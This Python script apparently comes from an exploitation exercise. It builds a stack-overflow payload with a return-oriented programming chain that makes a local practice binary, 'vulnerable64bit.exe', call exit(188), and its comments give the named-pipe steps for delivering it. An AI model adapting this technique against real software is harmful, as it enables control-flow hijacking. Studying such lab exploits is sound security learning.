import pathlib
from exploitsCommon import *


# In order to run this exploit:
# - Run in a terminal:
#     - mkfifo ./bin/mypipe
#     - cat ./bin/mypipe | ./bin/vulnerable64bit.exe fread ; echo Return code is $?
# - Run in another terminal:
#     - python3 ./exploits/payloadSyscallExit64.py && cat ./exploits/payloadSyscallExit64.dat > ./bin/mypipe
# - Go back to the first terminal and wait a few seconds.


if __name__ == "__main__":
    Utils.changeCWDToScriptDirectory()

    print('Scanning bytes...')
    eb = ExploitBuilder(targetProcessName='vulnerable64bit.exe', archBitSize=64)

    # The vulnerable executable will call `exit(returnCode)`;
    returnCode = 188

    payloadComponents = [
        b'\xFF' * 100, # Add padding to get over the stack buffer.
        b'\xFF' * 12, # Add padding to get over ??.
        b'\xFF' * 8, # Add padding to get over the stored RBP value.

        # RDI = returnCode;
        eb.getBytesOfInstrSeqAddress('pop rdi; ret'),
        returnCode.to_bytes(8, 'little'),

        # RAX = 60; (system call number for `exit();`)
        eb.getBytesOfInstrSeqAddress('pop rax; ret'),
        (60).to_bytes(8, 'little'),

        # call `exit(RDI);`
        eb.getBytesOfInstrSeqAddress('syscall; ret'),
    ]

    # Concatenate payload
    payload = b''.join(payloadComponents)

    # Prepend the size of the payload to itself
    payloadSize = len(payload)
    payload = payloadSize.to_bytes(4, sys.byteorder) + payload

    print()
    print(f"len(payload) = {len(payload)}")
    print(f"payload = {payload.hex()}")

    scriptFileNameWithoutExtension = pathlib.Path(__file__).stem
    with open(f'{scriptFileNameWithoutExtension}.dat', 'wb') as fout:
        fout.write(payload)
